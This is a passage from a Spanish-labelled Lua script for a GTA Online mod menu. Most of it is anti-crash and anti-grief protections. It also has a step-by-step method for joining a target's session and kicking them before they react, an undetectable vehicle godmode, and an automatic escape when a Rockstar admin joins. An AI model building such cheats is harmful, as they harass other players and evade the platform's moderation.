    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    local BlockBailing = menu.ref_by_path("Online>Protections>Block Bailing>Player No Longer In Session")
    local BlockBailing2 = menu.ref_by_path("Online>Protections>Block Bailing>Switching Primary Crew")
    local BlockBailing3 = menu.ref_by_path("Online>Protections>Block Bailing>Spectating Related")
    local BlockBailing4 = menu.ref_by_path("Online>Protections>Block Bailing>Other Reasons")
    local ShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Enabled")
    local BlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Notification>Disabled")
    local UnBlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local DontAsk = menu.ref_by_path("Online>Transitions>Speed Up>Don't Ask For Permission To Spawn")
    if on_toggle then
        menu.trigger_commands("nobgscript on")
        menu.trigger_commands("skipbroadcast on")
        menu.trigger_commands("speedupspawn on")
        menu.trigger_commands("speedupfmmc on")
        menu.trigger_commands("skipswoopdown on")
        menu.trigger_commands("nospawnactivities on")
        menu.trigger_commands("showtransitionstate on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_command(BlockBailing, "on")
        menu.trigger_command(BlockBailing2, "on")
        menu.trigger_command(BlockBailing3, "on")
        menu.trigger_command(BlockBailing4, "on")
        menu.trigger_command(ShowNotis)
        menu.trigger_command(BlockRaw)
        menu.trigger_command(DontAsk, "on")
        util.toast("Activado, ahora entra a su sesion y prepara el kick")
    else
        menu.trigger_commands("nobgscript off")
        menu.trigger_commands("skipbroadcast off")
        menu.trigger_commands("speedupspawn off")
        menu.trigger_commands("speedupfmmc off")
        menu.trigger_commands("skipswoopdown off")
        menu.trigger_commands("nospawnactivities off")
        menu.trigger_commands("showtransitionstate off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_command(BlockBailing3, "off")
        menu.trigger_command(UnShowNotis)
        menu.trigger_command(UnBlockRaw)
        menu.trigger_command(DontAsk, "off")
        util.toast("Listo, todo desactivado")
    end
end)

local testmeth = menu.list(bypasskick, "Metodo Funcional", {}, "Lee con cautela las instrucciones en las opciones.")

menu.divider(testmeth, "Fase 1", {}, "")

menu.toggle(testmeth, "Activa Esto", {}, "Activa esto antes de seleccionar el nombre. \nDesactiva en el paso 3", function(on)
    if on then
        menu.trigger_commands("bkick1 on")
    else
        menu.trigger_commands("bkick1 off")
    end
end)

menu.divider(testmeth, "Fase 2", {}, "")

menu.text_input(testmeth, "Nombre (Join)", {"name"}, "Escribe el nombre del jugador. \nPara entrar a su sesion.", function(playername)
    menu.trigger_commands("historyspectate".. playername)
end)

menu.divider(testmeth, "Fase 3", {}, "")

menu.text_input(testmeth, "Nombre (Kick)", {"name2"}, "Escribe el nombre del jugador. \nPara kickearle antes que se de cuenta.", function(playername)
    menu.trigger_commands("kick".. playername)
end)

menu.divider(testmeth, "Fase 3", {}, "")
menu.action(testmeth, "Dame Click", {}, "Dale click aqui cuando estes en la sesion y lo hayas kickeado.", function()
    menu.trigger_commands("rejoin")
end)

--menu.action(testmeth, "Metodo en testeo", {}, "Este metodo no se ha probado previamente \nVa por pasos, estate atento", function()
--menu.trigger_commands("historyspectate" .. name)
--end)

--------------------------------------------------------------------------------------------------------------------------------
--Protecciones

menu.action(protects, "Parar Todos Los Sonidos", {"stopsounds"}, "", function()
    for i = -1,100 do
        AUDIO.STOP_SOUND(i)
        AUDIO.RELEASE_SOUND_ID(i)
    end
end)

menu.action(protects, "Quitar ring", {}, "Quita el ringtone del celular parando que deje de sonar.", function()
    local player = PLAYER.PLAYER_PED_ID()
    menu.trigger_commands("nophonespam on")
    if AUDIO.IS_PED_RINGTONE_PLAYING(player) then
        for i = -1, 100 do
            AUDIO.STOP_PED_RINGTONE(i)
            AUDIO.RELEASE_SOUND_ID(i)
        end

    end
    util.yield(1000)
    menu.trigger_commands("nophonespam off")
end)

menu.action(protects, "Quitar Cosas", {}, "Quitara las cosas pegadas a ti.", function()
    if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
        menu.trigger_commands("mpmale")
    else
        menu.trigger_commands("mpfemale")
    end
end)

local quitarf = menu.list(protects, "Metodos De Anti Freeze")

menu.action(quitarf, "Quitar Freeze V1", {}, "Intenta reiniciar algunos nativos para quitarte el estado de freeze.", function()
    local player = PLAYER.PLAYER_PED_ID()
    ENTITY.FREEZE_ENTITY_POSITION(player, false)
    MISC.OVERRIDE_FREEZE_FLAGS(p0)
    menu.trigger_commands("rcleararea")
end)

menu.action(quitarf, "Quitar Freeze V2 'Test'", {}, "Intenta reiniciar algunos nativos para quitarte el estado de freeze \nCon este metodo moriras.", function()
    local player = PLAYER.PLAYER_PED_ID()
    local playerpos = ENTITY.GET_ENTITY_COORDS(player, false)
    ENTITY.FREEZE_ENTITY_POSITION(player, false)
    ENTITY.SET_ENTITY_SHOULD_FREEZE_WAITING_ON_COLLISION(player, false)
    ENTITY.SET_ENTITY_COORDS(player, playerpos.x, playerpos.y, playerpos.z, 1, false)
    MISC.OVERRIDE_FREEZE_FLAGS(p0)
    menu.trigger_commands("rcleararea")
end)

menu.toggle(protects, "Modo Panico", {"panic"}, "Esto renderiza un modo de anti-crash quitando todo tipo de evento del juego a toda costa.", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_commands("desyncall on")
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")
    else
        menu.trigger_commands("desyncall off")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end
end)

menu.toggle(protects, "Prevenir Crasheos", {}, "Intenta bloquear los crasheos \nActiva si te estan por crashear.", function(on_toggle)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    local ped = PLAYER.GET_PLAYER_PED(players.user())
    if on_toggle then
        util.yield(300)
        ENTITY.SET_ENTITY_COORDS(ped, 25.030561, 7640.8735, 17.831139, 1, false)
        util.yield(600)
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("trafficpotato on")
        util.yield(2000)
        menu.trigger_commands("rclearworld")
    else        
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("anticrashcamera off")
        menu.trigger_commands("trafficpotato off")
        util.yield(800)
        --Fixing it next update
        --ENTITY.SET_ENTITY_COORDS(player, lastpos.x, lastpos.y, lastpos.z, 1, true)
        ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, false)
        util.yield(500)
        menu.trigger_commands("rclearworld")
        util.yield(1000)
        menu.trigger_commands("rcleararea")
        util.toast("Crasheo Prevenido :b")
    end
end)


menu.toggle_loop(protects, "Salir si admin de R*", {}, "Si detecta un admin de R* te cambia de sesion.", function(on)
    bailOnAdminJoin = on
end)

if bailOnAdminJoin then
    if players.is_marked_as_admin(player_id) then
        util.toast(players.get_name(player_id) .. " Hay un admin, pa otra sesion")
        menu.trigger_commands("quickbail")
        return
    end
end

menu.toggle_loop(protects, "Bloquear Error De Transaccion", {}, "Es probable que conlleve errores, usar bajo responsabilidad", function(on_toggle)
    if HUD.GET_WARNING_SCREEN_MESSAGE_HASH() == -991495373 then
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
        util.yield(100)
    end
end)

--menu.toggle_loop(protects, "Bloquear Fuego/Lag", {}, "", function()
--    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
--    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
--    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
--end)

menu.toggle_loop(protects, "Bloquear PTFX", {}, "", function()
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
end)

if menu.get_edition() == 3 then
    menu.toggle_loop(protects, "Anti Bestia", {}, "Previene que te vuelvan la bestia con stand etc.", function()
        if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_hunt_the_beast")) > 0 then
            local host
            repeat
                host = NETWORK.NETWORK_GET_HOST_OF_SCRIPT("am_hunt_the_beast", -1, 0)
                util.yield()
            until host ~= -1
            util.toast(players.get_name(host).." started Hunt The Beast. Killing script...")
            menu.trigger_command(menu.ref_by_path("Online>Session>Session Scripts>Hunt the Beast>Stop Script"))
        end
    end)
end

menu.toggle_loop(protects, "Anti Error De transaction ", {}, "Bloquea mi propio script para lograr esto :/.", function()
    if util.spoof_script("am_destroy_veh", SCRIPT.TERMINATE_THIS_THREAD) then
        util.toast("Terminando script (Detectado)")
    end
end)

menu.toggle(protects, "Mantenme seguro", {"safeass"}, "Utiliza cierta parte de los nativos para mantenerte en estado seguro.", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    ENTITY.CREATE_MODEL_HIDE(pos.x, pos.y, pos.z, 10000.0, 1269906701, true)
    util.yield(75)
    ENTITY.CREATE_MODEL_HIDE(pos.x, pos.y, pos.z, 10000.0, -950858008, true)
    util.yield(75)
end)

local values = {
    [0] = 0,
    [1] = 50,
    [2] = 88,
    [3] = 160,
    [4] = 208,
}

local anticage = menu.list(protects, "Proteccion Anti-Jaula", {}, "")
local alpha = 160
menu.slider(anticage, "Alpha de Jaula", {"cagealpha"}, "Transparencia de jaula. Si esta en 0 no la veras", 0, #values, 3, 1, function(amount)
    alpha = values[amount]
end)

menu.toggle_loop(anticage, "Anti Jaula", {"anticage"}, "", function()
    local user = players.user_ped()
    local veh = PED.GET_VEHICLE_PED_IS_USING(user)
    local my_ents = {user, veh}
    for i, obj_ptr in ipairs(entities.get_all_objects_as_pointers()) do
        local net_obj = memory.read_long(obj_ptr + 0xd0)
        if net_obj == 0 or memory.read_byte(net_obj + 0x49) == players.user() then
            continue
        end
        local obj_handle = entities.pointer_to_handle(obj_ptr)
        CAM.SET_GAMEPLAY_CAM_IGNORE_ENTITY_COLLISION_THIS_UPDATE(obj_handle)
        for i, data in ipairs(my_ents) do
            if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha > 0 then
                util.toast("Te estan intentando enjaular.")
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj_handle, data, false)
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, obj_handle, false)
                ENTITY.SET_ENTITY_ALPHA(obj_handle, alpha, false)
            end
            if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha == 0 then
                entities.delete_by_handle(obj_handle)
            end
        end
        SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(obj_handle)
    end
end)

fmugger = menu.list(protects, "Objetos/Peds", {}, "")

local anti_mugger = menu.list(protects, "Anti-Mugger")

menu.toggle_loop(anti_mugger, "Hacia Mi", {}, "Bloquear Muggers dirigidos a ti.", function() -- thx nowiry for improving my method :D
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if (memory.read_int(sender) ~= player and memory.read_int(target) == player 
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId))) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("Blocked mugger from " .. players.get_name(memory.read_int(sender)))
            end
        end)
    end
end)

menu.toggle_loop(anti_mugger, "Alguien mas", {}, "Bloquear Muggers dirigidos a otra persona.", function()
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if memory.read_int(target) ~= player and memory.read_int(sender) ~= player
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId)) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("Block mugger sent by " .. players.get_name(memory.read_int(sender)) .. " to " .. players.get_name(memory.read_int(target)))
            end
        end)
    end
end)

menu.toggle_loop(fmugger, "Objetos F/", {"ghostobjects"}, "Deshabilita colisiones con objetos", function()
    local user = players.user_ped()
    local veh = PED.GET_VEHICLE_PED_IS_USING(user)
    local my_ents = {user, veh}
    for i, obj_ptr in ipairs(entities.get_all_objects_as_pointers()) do
        local net_obj = memory.read_long(obj_ptr + 0xd0)
        local obj_handle = entities.pointer_to_handle(obj_ptr)
        ENTITY.SET_ENTITY_ALPHA(obj_handle, 255, false)
        CAM.SET_GAMEPLAY_CAM_IGNORE_ENTITY_COLLISION_THIS_UPDATE(obj_handle)
        for i, data in ipairs(my_ents) do
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj_handle, data, false)
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, obj_handle, false)  
        end
        SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(obj_handle)
    end
end)

menu.toggle_loop(fmugger, "Vehiculos F/", {"ghostvehicles"}, "Deshabilita colisiones con coches", function()
    local user = players.user_ped()
    local veh = PED.GET_VEHICLE_PED_IS_USING(user)
    local my_ents = {user, veh}
    for i, veh_ptr in ipairs(entities.get_all_vehicles_as_pointers()) do
        local net_veh = memory.read_long(veh_ptr + 0xd0)
        local veh_handle = entities.pointer_to_handle(veh_ptr)
        ENTITY.SET_ENTITY_ALPHA(veh_handle, 255, false)
        CAM.SET_GAMEPLAY_CAM_IGNORE_ENTITY_COLLISION_THIS_UPDATE(veh_handle)
        for i, data in ipairs(my_ents) do
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(veh_handle, data, false)
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, veh_handle, false)  
        end
        SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(veh_handle)
    end
end)

local pool_limiter = menu.list(protects, "Limitador Pool", {}, "")
local ped_limit = 175
menu.slider(pool_limiter, "Limitador pool/Peds", {"pedlimit"}, "", 0, 256, 175, 1, function(amount)
    ped_limit = amount
end)

local veh_limit = 200
menu.slider(pool_limiter, "Limitador pool/Vehiculos", {"vehlimit"}, "", 0, 300, 150, 1, function(amount)
    veh_limit = amount
end)

local obj_limit = 750
menu.slider(pool_limiter, "Limitador pool/Objetos", {"objlimit"}, "", 0, 2300, 750, 1, function(amount)
    obj_limit = amount
end)

local projectile_limit = 25
menu.slider(pool_limiter, "Limitador pool/Projectiles", {"projlimit"}, "", 0, 50, 25, 1, function(amount)
    projectile_limit = amount
end)

menu.toggle_loop(pool_limiter, "Activar limitador pool", {}, "", function()
    local ped_count = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        util.yield()
        if ped ~= players.user_ped() then
            ped_count += 1
        end
        if ped_count >= ped_limit then
            for _, ped in pairs(entities.get_all_peds_as_handles()) do
                util.yield()
                entities.delete_by_handle(ped)
            end
            util.toast("Limpiando bools de peds...")
        end
    end
    local veh__count = 0
    for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
        util.yield()
        veh__count += 1
        if veh__count >= veh_limit then
            for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
                entities.delete_by_handle(veh)
            end
            util.toast("Limpiando bools de vehiculos...")
        end
    end
    local obj_count = 0
    for _, obj in pairs(entities.get_all_objects_as_handles()) do
        util.yield()
        obj_count += 1
        if obj_count >= obj_limit then
            for _, obj in pairs(entities.get_all_objects_as_handles()) do
                entities.delete_by_handle(obj)
            end
            util.toast("Limpiando bools de objetos...")
        end
    end
end)

--------------------------------------------------------------------------------------------------------------------------------
-- Coches
my_cur_car = entities.get_user_vehicle_as_handle()
menu.toggle_loop(vehicles, "SpiderMan 'Test'", {}, "Forzara tu vehiculo al suelo \nTendras que pegarte a un edifico primero.", function()
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ryze.my_cur_car)
    util.yield(50)
    ENTITY.APPLY_FORCE_TO_ENTITY(ryze.my_cur_car, 1, 0, 0, -1, 0, 0, 0.5, 0, false, false, true)
end)

menu.toggle_loop(vehicles, "Salto Vehicular 'Test'", {}, "Podras saltar con el carro cliqueando 2 veces rapidamente la \"W\"", function()
    if VEHICLE.GET_PED_IN_VEHICLE_SEAT(ryze.my_cur_car, -1, false) == PLAYER.PLAYER_PED_ID() and PED.IS_PED_IN_VEHICLE(PLAYER.PLAYER_PED_ID(), ryze.my_cur_car, true) then
        if PAD.IS_CONTROL_JUST_PRESSED(32, 32) then
            if not (util.current_time_millis() - ryze.pressedT <= ryze.maxTimeBetweenPress) then
                ryze.pressedT = util.current_time_millis()
                return
            end
            local mySpeed = ENTITY.GET_ENTITY_SPEED(ryze.my_cur_car)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(ryze.my_cur_car, 1, 0, 2, (mySpeed / 10) + 14, 0, true, true, true)
            AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Hydraulics_Down", PLAYER.PLAYER_PED_ID(), "Lowrider_Super_Mod_Garage_Sounds", true, 20)
        end
    end
end)

menu.toggle_loop(vehicles, "Apuntar Pasajeros", {}, "Te da la habilidad de poder apuntarle a pasajeros.", function()
	local localPed = players.user_ped()
	if not PED.IS_PED_IN_ANY_VEHICLE(localPed, false) then
		return
	end
	local vehicle = PED.GET_VEHICLE_PED_IS_IN(localPed, false)
	for seat = -1, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(vehicle) - 1 do
		local ped = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, seat, false)
		if ENTITY.DOES_ENTITY_EXIST(ped) and ped ~= localPed and PED.IS_PED_A_PLAYER(ped) then
			local playerGroupHash = PED.GET_PED_RELATIONSHIP_GROUP_HASH(ped)
			local myGroupHash = PED.GET_PED_RELATIONSHIP_GROUP_HASH(localPed)
			PED.SET_RELATIONSHIP_BETWEEN_GROUPS(4, playerGroupHash, myGroupHash)
		end
	end
end)

menu.toggle_loop(vehicles, "Poder Bloquear Misiles", {}, "Podras apuntarle con misiles a las personas que lo bloquean.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            VEHICLE.SET_VEHICLE_ALLOW_HOMING_MISSLE_LOCKON_SYNCED(veh, true)
        end
    end
end)

menu.toggle_loop(vehicles, "GodMode Silencioso", {}, "No sera detectado por la mayoria de menus", function()
    ENTITY.SET_ENTITY_PROOFS(entities.get_user_vehicle_as_handle(), true, true, true, true, true, 0, 0, true)
    end, function() ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(players.user(), false), false, false, false, false, false, 0, 0, false)
end)

menu.toggle_loop(vehicles, "Luces Indicadoras", {}, "", function()
    if(PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false)) then
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)

        local left = PAD.IS_CONTROL_PRESSED(34, 34)
        local right = PAD.IS_CONTROL_PRESSED(35, 35)
        local rear = PAD.IS_CONTROL_PRESSED(130, 130)

        if left and not right and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
        elseif right and not left and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        elseif rear and not left and not right then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        else
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, false)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, false)
        end
    end
end)

modificaciones = menu.list(vehicles, "Modificaciones a Vehiculos", {}, "")

--menu.click_slider_float(modificaciones, "Suspension", {"suspensionheight"}, "", -100, 100, 0, 1, function(value)
--    value/=100
--    local player = players.user_ped()
--    local pos = ENTITY.GET_ENTITY_COORDS(player, false)
--    local VehicleHandle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
--    if VehicleHandle == 0 then return end
--    local CAutomobile = entities.handle_to_pointer(VehicleHandle)
--    local CHandlingData = memory.read_long(CAutomobile + 0x0938)
--    memory.write_float(CHandlingData + 0x00D0, value)
--    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(VehicleHandle, pos.x, pos.y, pos.z + 2.8, false, false, false) -- Dropping vehicle so the suspension updates
--end)

--menu.click_slider_float(modificaciones, "Torque", {"torque"}, "", 0, 1000, 100, 10, function(value)
--    value/=100
--    local VehicleHandle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
--    if VehicleHandle == 0 then return end
--    local CAutomobile = entities.handle_to_pointer(VehicleHandle)
--    local CHandlingData = memory.read_long(CAutomobile + 0x0938)
--    memory.write_float(CHandlingData + 0x004C, value)
--end)

--menu.click_slider_float(modificaciones, "Upshift", {"upshift"}, "", 0, 500, 100, 10, function(value)
--    value/=100
--    local VehicleHandle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
--    if VehicleHandle == 0 then return end
--    local CAutomobile = entities.handle_to_pointer(VehicleHandle)
--    local CHandlingData = memory.read_long(CAutomobile + 0x0938)
--    memory.write_float(CHandlingData + 0x0058, value)
--end)

--menu.click_slider_float(modificaciones, "DownShift", {"downshift"}, "", 0, 500, 100, 10, function(value)
--    value/=100
--    local VehicleHandle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
--    if VehicleHandle == 0 then return end
--    local CAutomobile = entities.handle_to_pointer(VehicleHandle)
--    local CHandlingData = memory.read_long(CAutomobile + 0x0938)
--    memory.write_float(CHandlingData + 0x005C, value)
--end)

--menu.click_slider_float(modificaciones, "Multiplicador De Curva", {"curve"}, "", 0, 500, 100, 10, function(value)
--    value/=100
--    local VehicleHandle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
--    if VehicleHandle == 0 then return end
--    local CAutomobile = entities.handle_to_pointer(VehicleHandle)
--    local CHandlingData = memory.read_long(CAutomobile + 0x0938)
--    memory.write_float(CHandlingData + 0x0094, value)
--end)

menu.action(modificaciones, "Mejoras Random", {}, "Solo funciona en los vehiculos que sacas manualmente.", function()
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), include_last_vehicle_for_vehicle_functions)
    if vehicle == 0 then util.toast("No estas en un vehiculo >.<") else
        for mod_type = 0, 48 do
            local num_of_mods = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, mod_type)
            local random_tune = math.random(-1, num_of_mods - 1)
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, mod_type, math.random(0,1) == 1)
            VEHICLE.SET_VEHICLE_MOD(vehicle, mod_type, random_tune, false)
        end
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, math.random(0,160), math.random(0,160))
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, math.random(0,6))
        for index = 0, 3 do
            VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, index, math.random(0,1) == 1)
        end
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        menu.trigger_command(menu.ref_by_path("Vehicle>Los Santos Customs>Appearance>Wheels>Wheels Colour", 42), math.random(0,160))
    end
end)

menu.toggle_loop(modificaciones, "Mejoras Random (Loop)", {}, "Solo funciona en los vehiculos que sacas manualmente.", function()
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), include_last_vehicle_for_vehicle_functions)
    if vehicle == 0 then util.toast("No estas en un vehiculo >.<") else
        for mod_type = 0, 48 do
            local num_of_mods = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, mod_type)
            local random_tune = math.random(-1, num_of_mods - 1)
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, mod_type, math.random(0,1) == 1)
            VEHICLE.SET_VEHICLE_MOD(vehicle, mod_type, random_tune, false)
        end
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, math.random(0,160), math.random(0,160))
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, math.random(0,6))
        for index = 0, 3 do
            VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, index, math.random(0,1) == 1)
        end
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        menu.trigger_command(menu.ref_by_path("Vehicle>Los Santos Customs>Appearance>Wheels>Wheels Colour", 42), math.random(0,160))
    end
end)

local rapid_khanjali
rapid_khanjali = menu.toggle_loop(modificaciones, "Fuego Rapido Khanjali", {}, "", function()
    local player_veh = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
    if ENTITY.GET_ENTITY_MODEL(player_veh) == util.joaat("khanjali") then
        VEHICLE.SET_VEHICLE_MOD(player_veh, 10, math.random(-1, 0), false)
    else
        util.toast("Entra a un khanjali.")
        menu.trigger_command(rapid_khanjali, "off")
    end
end)

player_cur_car = 0

menu.toggle_loop(modificaciones, "A prueba de balas", {}, "Genera un estado del vehiculo aprueba de todo", function(on)
    local play = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    if on then
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(play), true, true, true, true, true, false, false, true)
    else
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(play), false, false, false, false, false, false, false, false)
    end
end)

infcms = false
menu.toggle(modificaciones, "Contramedidas Infinitas", {"infinitecms"}, "Dara contramedidas infinitas.", function(on)
    infcms = on
end)

if player_cur_car ~= 0 then
    --if racemode then
    --    VEHICLE.SET_VEHICLE_IS_RACING(player_cur_car, true)
    --end

    if infcms then
        if VEHICLE.GET_VEHICLE_COUNTERMEASURE_AMMO(player_cur_car) < 100 then
            VEHICLE.SET_VEHICLE_COUNTERMEASURE_AMMO(player_cur_car, 100)
        end
    end

    --if shift_drift then
    --    if PAD.IS_CONTROL_PRESSED(21, 21) then
    --        VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, true)
    --        VEHICLE._SET_VEHICLE_REDUCE_TRACTION(player_cur_car, 0.0)
    --    else
    --        VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, false)
    --    end
    --end
end

--force_cm = false
--menu.toggle(vehicles, "Forzar Contramedidas", {"forcecms"}, "Fuerza las contramedidas en cualquier vehiculo a la tecla del claxon.", function(on)
--    force_cm = on
--    menu.trigger_commands("getgunsflaregun")
--end)

--if player_cur_car ~= 0 and force_cm then
--    if PAD.IS_CONTROL_PRESSED(46, 46) then
--        local target = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(player_id), math.random(-5, 5), -30.0, math.random(-5, 5))
--        --MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target.x, target.y, target.z, target.x, target.y, target.z, 300.0, true, -1355376991, PLAYER.PLAYER_PED_ID(player_id), true, false, 100.0)
--        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target.x, target.y, target.z, target.x, target.y, target.z, 100.0, true, 1198879012, PLAYER.PLAYER_PED_ID(player_id), true, false, 100.0)
--    end
--end

--------------------------------------------------------------------------------------------------------------------------------------------------------
-- Real Helicopter Mode Start

